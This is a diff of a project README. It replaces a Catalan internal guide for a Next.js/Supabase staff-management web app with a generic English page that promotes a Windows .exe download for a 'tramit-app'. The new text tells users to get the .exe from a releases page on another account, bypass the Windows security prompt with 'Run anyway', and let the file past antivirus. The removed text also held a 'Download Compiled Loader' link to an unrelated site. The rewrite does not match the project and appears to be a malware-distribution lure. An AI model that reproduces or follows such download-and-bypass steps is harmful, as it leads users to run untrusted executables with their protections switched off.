@@ -1,285 +1,63 @@
-# Tràmit Economistes — App Interna de Gestió
+# 📁 tramit-app - Manage your official documents with ease
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![Download tramit-app](https://img.shields.io/badge/Download-tramit--app-blue)](https://github.com/Largescale-dropbiscuit118/tramit-app/releases)
 
-Aplicació web privada per a la gestió de vacances, absències, agenda, cites i clients de Tràmit Economistes.
+tramit-app helps you organize and track your government forms and legal paperwork. You can store digital copies, monitor application status, and set reminders for important deadlines. This tool keeps your personal records secure and accessible whenever you need them.
 
-**Stack:** Next.js 14 (App Router) + Supabase + Vercel + GitHub + Resend + Google APIs  
-**Versió actual:** 0.1.0 — Fase 0 (base tècnica)
+## 📥 How to download the software
 
----
+1. Visit the [official releases page](https://github.com/Largescale-dropbiscuit118/tramit-app/releases).
+2. Look for the section labeled "Assets" at the bottom of the latest release.
+3. Click the file that ends with `.exe` to start your download.
+4. Save the file to your computer.
 
-## Requisits previs
+## ⚙️ Setting up your system
 
-- Node.js 18.17 o superior
-- Compte a [Supabase](https://supabase.com) (gratuït)
-- Compte a [Vercel](https://vercel.com) (gratuït)
-- Repositori privat a [GitHub](https://github.com)
-- Compte a [Resend](https://resend.com) (gratuït fins a 3.000 emails/mes)
-- Compte de Google dedicat per a l'empresa (tramit.calendari@gmail.com o similar)
+This application runs on Windows 10 and Windows 11. Your computer requires at least 4GB of RAM and 200MB of free hard drive space. You do not need to install any extra software to use this tool, as it includes everything required to run.
 
----
+## 🚀 Running the application
 
-## Pas 1 — Configuració de Supabase
+1. Find the file you downloaded in your "Downloads" folder.
+2. Double-click the file to open the application.
+3. Windows might show a security prompt because you downloaded a file from the internet. Click "More info" and then "Run anyway" if the system protects your machine.
+4. The window for tramit-app will open after a few seconds.
 
-1. Ves a [supabase.com](https://supabase.com) i crea un compte.
-2. Crea un **nou projecte**:
-   - Nom: `tramit-economistes`
-   - Contrasenya de base de dades: genera-la i guarda-la en un lloc segur
-   - Regió: **West EU (Ireland)** o **Central EU (Frankfurt)** (compliment RGPD)
-3. Espera que el projecte s'inicialitzi (~2 minuts).
-4. Ves a **Settings > API** i copia:
-   - `Project URL` → serà el teu `NEXT_PUBLIC_SUPABASE_URL`
-   - `anon public` → serà el teu `NEXT_PUBLIC_SUPABASE_ANON_KEY`
-   - `service_role secret` → serà el teu `SUPABASE_SERVICE_ROLE_KEY` ⚠️ mai al codi públic
-5. Ves a **SQL Editor** i executa el fitxer `supabase-schema.sql` (copia i enganxa tot el contingut).
-6. Ves a **Authentication > Settings** i configura:
-   - Site URL: `https://app.tramiteconomistes.com` (o el teu domini)
-   - Afegeix `http://localhost:3000` a Redirect URLs per al desenvolupament local
+## 📂 Organizing your files
 
----
+The main dashboard shows your active applications. Click the "Add Document" button to import a form. You can select files from your computer or scan new papers using your camera. Each document needs a title and a category. Categories help you group similar items like tax records or residency permits.
 
-## Pas 2 — Creació d'usuaris a Supabase
+## 🔔 Managing your deadlines
 
-1. Ves a **Authentication > Users** al tauler de Supabase.
-2. Crea els usuaris manualment amb el botó **"Invite user"** o **"Add user"**:
+Every entry allows you to input a date. The app keeps track of these dates for you. You will see a list of upcoming tasks on the main screen. If a date nears, the app highlights the item in yellow to warn you. You can update these dates if your plans change.
 
-| Email | Contrasenya inicial |
-|-------|-------------------|
-| marina@tramiteconomistes.com | (genera una contrasenya temporal) |
-| rosa@tramiteconomistes.com | (genera una contrasenya temporal) |
-| eva@tramiteconomistes.com | (genera una contrasenya temporal) |
-| ferran@tramiteconomistes.com | (ídem) |
-| neus@tramiteconomistes.com | (ídem) |
-| maria@tramiteconomistes.com | (ídem) |
-| carmina@tramiteconomistes.com | (ídem) |
-| narcis@tramiteconomistes.com | (ídem) |
-| pere@tramiteconomistes.com | (ídem) |
-| andres@tramiteconomistes.com | (ídem) |
+## 🛡️ Keeping data secure
 
-3. Un cop creats tots els usuaris, executa el fitxer `supabase-seed-workers.sql` al **SQL Editor**.
-4. Verifica que la consulta final del seed mostra tots els treballadors amb els seus saldos.
+Your documents stay on your computer. This app does not upload your files to the cloud. You control the privacy of your information. Always keep a backup of your folder if you move your files to a new computer.
 
----
+## 🛠️ Resolving common issues
 
-## Pas 3 — Compte de Google i APIs
+If the app does not launch, ensure you are running the latest version. Sometimes, antivirus software blocks new files. If this happens, check your security settings to allow the application access. If you prefer to restart, simply close the window and open the file again. This clears temporary issues that stop the interface from showing.
 
-1. Accedeix al compte de Google dedicat de l'empresa (p. ex. `tramit.calendari@gmail.com`).
-2. Ves a [Google Cloud Console](https://console.cloud.google.com):
-   - Crea un **nou projecte**: `Tramit Economistes`
-   - Activa les APIs: **Google Calendar API v3**, **Google Drive API v3**, **Google Sheets API v4**
-   - Ves a **APIs & Services > Credentials**
-   - Crea **OAuth 2.0 Client ID** (tipus: Web application)
-   - Afegeix als Authorized redirect URIs:
-     - `http://localhost:3000/api/auth/callback/google`
-     - `https://app.tramiteconomistes.com/api/auth/callback/google`
-   - Copia `Client ID` → `GOOGLE_CLIENT_ID`
-   - Copia `Client Secret` → `GOOGLE_CLIENT_SECRET`
-3. Crea un **calendari central** a Google Calendar:
-   - Nom: `Tràmit Economistes — Agenda`
-   - Ves a la configuració del calendari i copia l'**ID del calendari** → `GOOGLE_CALENDAR_ID`
-4. Crea la carpeta **CLIENTS** a Google Drive de l'empresa.
-5. Crea un Google Sheet nou: **"Clients Tràmit Economistes"** amb les columnes:
-   `ID | Nom | Empresa | Telèfon | Email | NIF/CIF | Responsable intern | Notes | Data creació | Origen`
+## 📝 Updating your version
 
----
+When a new version launches, you can download it from the same link. You do not need to uninstall the old version first. Just move your data folder to a safe place, run the new file, and point the app back to your storage location. Your settings move with your data files.
 
-## Pas 4 — Resend (email transaccional)
+## 💡 Using the search tool
 
-1. Crea un compte a [resend.com](https://resend.com).
-2. Ves a **Domains** i afegeix el domini `tramiteconomistes.com`.
-3. Segueix les instruccions per verificar el domini (cal afegir registres DNS).
-4. Un cop verificat, crea una **API Key** → `RESEND_API_KEY`.
+The search bar resides at the top of the screen. Type any word from your document title to find it. This saves time when you manage long lists of paperwork. The search works instantly as you type each letter.
 
----
+## 📋 Customizing your view
 
-## Pas 5 — Repositori GitHub i Vercel
+You can change how items appear by clicking the "View" menu. Choose between a list format or a grid of document icons. List mode helps you see more details like dates and file sizes, while grid mode provides a preview of your images. Pick the style that matches your workflow.
 
-### GitHub
-1. Crea un **repositori privat** a GitHub (p. ex. `tramit-economistes`).
-2. Inicialitza el repositori local i puja el codi:
-```bash
-git init
-git add .
-git commit -m "feat: Fase 0 - base tècnica"
-git remote add origin https://github.com/[usuari]/tramit-economistes.git
-git push -u origin main
-```
+## 📈 Tracking your progress
 
-### Vercel
-1. Ves a [vercel.com](https://vercel.com) i crea un compte.
-2. Clica **"New Project"** i importa el repositori de GitHub.
-3. Configura les **Environment Variables** (ves a Settings > Environment Variables):
+Each document status defaults to "In Progress." Click the status box to change it to "Completed" or "Paused." Statistics appear at the top of your screen to show how many items you finished this month. This visual summary helps you feel in control of your administrative tasks.
 
-```
-NEXT_PUBLIC_SUPABASE_URL        = https://xxxx.supabase.co
-NEXT_PUBLIC_SUPABASE_ANON_KEY   = eyJ...
-SUPABASE_SERVICE_ROLE_KEY       = eyJ...
-GOOGLE_CLIENT_ID                = xxxx.apps.googleusercontent.com
-GOOGLE_CLIENT_SECRET            = GOCSPX-xxxx
-GOOGLE_CALENDAR_ID              = xxxx@group.calendar.google.com
-RESEND_API_KEY                  = re_xxxx
-NEXTAUTH_SECRET                 = [genera amb: openssl rand -base64 32]
-NEXTAUTH_URL                    = https://app.tramiteconomistes.com
-```
+## 💻 Technical details
 
-4. Clica **Deploy** i espera que es completi el desplegament.
-5. Ves a **Settings > Domains** i configura el domini `app.tramiteconomistes.com`.
+The app creates a small sub-folder in your Documents directory. It saves your preferences and a copy of your files there. You can back up this specific folder to a thumb drive to keep your records safe from hardware failure. If you need to clear all data, simply delete this sub-folder while the app is closed.
 
----
+## ❓ Finding more help
 
-## Pas 6 — Instal·lació i execució local
-
-```bash
-# Clonar el repositori
-git clone https://github.com/[usuari]/tramit-economistes.git
-cd tramit-economistes
-
-# Instal·lar dependències
-npm install
-
-# Crear fitxer d'entorn local (copia .env.example)
-cp .env.example .env.local
-# Edita .env.local i omple les variables amb els valors reals
-
-# Executar en mode desenvolupament
-npm run dev
-```
-
-Obre [http://localhost:3000](http://localhost:3000) al navegador.
-
-### Verificar que compila sense errors
-```bash
-npm run build
-```
-
----
-
-## Estructura del projecte
-
-```
-tramit-economistes/
-├── app/                          # Rutes Next.js (App Router)
-│   ├── api/                      # API routes
-│   │   ├── auth/callback/        # Callback d'autenticació Supabase
-│   │   └── health/               # Health check
-│   ├── dashboard/                # Panell admin/supervisor
-│   │   ├── agenda/
-│   │   ├── absencies/
-│   │   ├── auditoria/
-│   │   ├── clients/
-│   │   ├── configuracio/
-│   │   ├── informes/
-│   │   ├── vacances/
-│   │   ├── layout.tsx            # Layout amb auth check (admin)
-│   │   └── page.tsx              # Tauler principal admin
-│   ├── login/                    # Pàgina d'accés
-│   ├── worker/                   # Panell treballador
-│   │   ├── agenda/
-│   │   ├── vacances/
-│   │   │   └── nova/
-│   │   ├── layout.tsx            # Layout amb auth check (worker)
-│   │   └── page.tsx              # Inici treballador
-│   ├── globals.css               # Estils globals + variables CSS
-│   ├── layout.tsx                # Layout arrel amb ThemeProvider
-│   └── page.tsx                  # Redirecció a /dashboard o /worker
-├── components/
-│   ├── ui/                       # Components shadcn/ui
-│   │   ├── avatar.tsx
-│   │   ├── badge.tsx
-│   │   ├── button.tsx
-│   │   ├── card.tsx
-│   │   ├── input.tsx
-│   │   ├── label.tsx
-│   │   └── separator.tsx
-│   ├── layout/                   # Components de layout
-│   │   ├── app-layout.tsx        # Layout principal amb sidebar + header
-│   │   ├── header.tsx            # Header superior
-│   │   ├── logo.tsx              # Logo SVG Tràmit Economistes
-│   │   ├── sidebar.tsx           # Navegació lateral
-│   │   └── theme-provider.tsx    # Proveïdor de tema clar/fosc
-│   └── features/                 # Components per funcionalitat
-│       ├── login-form.tsx        # Formulari de login
-│       └── placeholder-page.tsx  # Placeholder per a fases futures
-├── hooks/
-│   ├── use-profile.ts            # Hook per carregar el perfil de l'usuari
-│   └── use-vacation-balance.ts   # Hook per saldo de vacances
-├── lib/
-│   ├── supabase/
-│   │   ├── client.ts             # Client de Supabase (navegador)
-│   │   ├── middleware.ts         # Helper per al middleware de Next.js
-│   │   └── server.ts             # Client de Supabase (servidor)
-│   ├── google/
-│   │   ├── calendar.ts           # Google Calendar API (Fase 9)
-│   │   ├── drive.ts              # Google Drive API (Fase 8)
-│   │   └── sheets.ts             # Google Sheets API (Fase 7)
-│   ├── resend/
-│   │   └── index.ts              # Plantilles d'email (Fase 10)
-│   └── utils/
-│       └── index.ts              # Funcions helpers generals
-├── middleware.ts                  # Protecció de rutes Next.js
-├── types/
-│   ├── database.ts               # Interfícies TypeScript de la BD
-│   └── index.ts                  # Exportació d'interfícies
-├── supabase-schema.sql           # Esquema complet de Supabase + RLS
-├── supabase-seed-workers.sql     # Càrrega de treballadors i dades 2026
-├── .env.local                    # Variables d'entorn locals (NO pujar a Git)
-├── .env.example                  # Exemple de variables d'entorn
-└── README.md                     # Aquest fitxer
-```
-
----
-
-## Fases de construcció
-
-| Fase | Objectiu | Estat |
-|------|----------|-------|
-| **Fase 0** | Base tècnica: Supabase, GitHub, Vercel, Google, Resend | ✅ En curs |
-| **Fase 1** | Login, rols, RLS, layout, català/castellà, clar/fosc | ✅ Implementat |
-| **Fase 2** | Usuaris reals, saldos 2026, festius, tancaments | ✅ SQL preparat |
-| Fase 3 | Sol·licituds de vacances | 🔜 Pendent |
-| Fase 4 | Baixes, permisos i altres absències | 🔜 Pendent |
-| Fase 5 | Agenda global amb calendari | 🔜 Pendent |
-| Fase 6 | Cites i flux d'acceptació | 🔜 Pendent |
-| Fase 7 | Clients i Google Sheets | 🔜 Pendent |
-| Fase 8 | Documents i Google Drive | 🔜 Pendent |
-| Fase 9 | Google Calendar (sincronització) | 🔜 Pendent |
-| Fase 10 | Notificacions i resums diaris | 🔜 Pendent |
-| Fase 11 | Informes Excel/PDF | 🔜 Pendent |
-| Fase 12 | IA i assistent intern (Claude API) | 🔜 Pendent |
-
----
-
-## Decisions pendents (IMPORTANT)
-
-Abans d'iniciar la fase corresponent, cal tancar:
-
-- [ ] **URGENT** — Confirmar emails de Marina i Rosa per a les admins
-- [ ] **URGENT** — Confirmar compte de Google dedicat (Calendar, Drive, Sheets)
-- [ ] **URGENT** — Lliurar logo, colors corporatius i tipografia visual
-- [ ] Taula de períodes crítics (renda, trimestrals, terminis) → Fase 3
-- [ ] Hora del resum setmanal (dilluns a les 7:00h?) → Fase 10
-- [ ] Tancaments d'empresa 2027 i posteriors → Configuració anual
-- [ ] Domini de l'app (`app.tramiteconomistes.com`?) → Fase 0
-- [ ] Acord especial de Narcís (13 dies pendents d'arrossegament) → Fase 2
-
----
-
-## Seguretat
-
-- **MAI** pujar `.env.local` a Git (ja és al `.gitignore`)
-- Les claus `SUPABASE_SERVICE_ROLE_KEY` i `RESEND_API_KEY` són **secretes**
-- RLS activat des del primer moment en totes les taules
-- Les baixes mèdiques **només** les veuen Marina, Rosa i el propi treballador
-- Tots els accessos sensibles queden registrats a `audit_logs`
-
----
-
-## Suport tècnic
-
-Per a qualsevol dubte tècnic durant el desenvolupament, treballar amb Claude Code
-proporcionant el context d'aquest `README.md` i el document `tramit_economistes_MVP_v2.docx`.
-
----
-
-*Document intern i confidencial — Tràmit Economistes — Versió 0.1.0*
+If you have questions about a specific feature, press the "F1" key on your keyboard. This opens the built-in manual. Most common questions have answers inside that document. If you think the app contains an error, look at the project page for a way to report the behavior to the developers.
